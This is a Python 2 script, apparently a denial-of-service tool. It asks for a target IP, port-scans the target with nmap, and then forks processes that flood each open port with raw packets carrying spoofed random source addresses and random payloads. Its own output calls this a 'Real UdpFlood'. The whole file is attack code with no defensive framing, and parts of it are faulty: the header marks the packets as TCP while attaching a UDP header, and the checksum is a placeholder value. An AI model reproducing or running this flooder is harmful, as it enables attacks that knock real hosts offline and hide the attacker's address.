import socket, sys
from struct import *
import os
import nmap
import time
import random
from random import randrange
import signal

def random_IP():
    not_valid = [10, 127, 169, 172, 192]
    ip_1 = randrange(1, 256)
    while ip_1 in not_valid:
        ip_1 = randrange(1, 256)
    src_ip = str(ip_1) + "." + str(randrange(1, 256)) + "." + str(randrange(1, 256)) + "." + str(randrange(1, 256))
    return src_ip

def attack(ip, lport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while 1: # flood
        for port in lport:
            src_ip = random_IP()
            dest_ip = ip  # or socket.gethostbyname('www.google.com')

            # ip header
            # see: http://www.360doc.com/content/12/1218/10/3405077_254722699.shtml
            ihl = 5  # IP header length
            version = 4  # version
            ihl_version = (version << 4) + ihl  # combine the first 8 bits
            tos = 0  # type of service
            tot_len = 20 + 20  # total length
            id = 54321  # identification
            frag_off = 0  # fragment offset
            ttl = 255  # time to live
            protocol = socket.IPPROTO_TCP  # protocal
            check = 10  # header checksum
            saddr = socket.inet_aton(src_ip)  # source address
            daddr = socket.inet_aton(dest_ip)  # destination address
            ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

            #udp header
            #http://blog.csdn.net/qq_30549833/article/details/60139328
            src_port = 49152
            dest_port = port
            data = random._urandom(1460)  # Creates data
            length = 8 + len(data)
            checksum = 0

            udp_header = pack('!HHHH', src_port, dest_port, length, checksum)

            packet = ip_header + udp_header

            sock.sendto(packet + data, (dest_ip, 1))

    sock.close()


def main():
    nm = nmap.PortScanner()

    counter = 0
    ip = raw_input('Target IP: ')  # The IP we are attacking
    print "Begin Port Scan..."
    nm.scan(ip, '1-443')
    # nm.scaninfo()
    print "Complete Port Scan..."

    # give value to proto
    for proto in nm[ip].all_protocols():
        pass
    print proto
    lport = nm[ip][proto].keys()
    lport.sort()

    pids = []

    print "Begin Real UdpFlood..."
    foo = 0
    while foo < 3:
        pid = os.fork()
        pids.append(pid)
        if pid == 0:
            time.sleep(10)
            for p in pids:
                if p != 0:
                    os.kill(int(p), signal.SIGTERM)
        else:
            attack(ip, lport)

        foo = foo + 1

main()